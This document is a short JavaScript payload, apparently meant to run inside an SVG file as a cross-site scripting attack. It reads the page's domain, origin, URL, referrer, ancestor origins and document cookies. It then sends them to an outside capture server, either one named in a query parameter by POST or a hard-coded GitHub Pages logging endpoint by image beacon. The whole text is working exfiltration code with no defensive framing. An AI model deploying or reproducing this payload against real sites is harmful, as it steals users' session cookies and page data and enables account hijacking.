svg.script:
var info = {
  domain: document.domain,
  origin: location.origin,
  href: location.href.slice(0, 200),
  cookie: document.cookie.slice(0, 200),
  referrer: document.referrer,
  ancestors: (function(){ try { return JSON.stringify([...location.ancestorOrigins]); } catch(e) { return 'N/A'; } })()
};
document.getElementById('d').textContent = 'domain: ' + info.domain;
document.getElementById('c').textContent = 'cookie: ' + (info.cookie || '(none)');
document.getElementById('o').textContent = 'origin: ' + info.origin;

// Exfiltrate to capture server via query param or beacon
var srv = new URLSearchParams(location.search).get('srv') || '';
if (!srv) {
  // Try to extract srv from referrer or just beacon to etho0
  var img = new Image();
  img.src = 'https://etho0.github.io/log?type=SVG_XSS_EXEC_REMOTE&domain=' +
    encodeURIComponent(info.domain) + '&origin=' + encodeURIComponent(info.origin) +
    '&cookie=' + encodeURIComponent(info.cookie) + '&href=' + encodeURIComponent(info.href);
} else {
  fetch(srv + '/log?type=SVG_XSS_EXEC_REMOTE', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(info)
  }).catch(function(){});
}
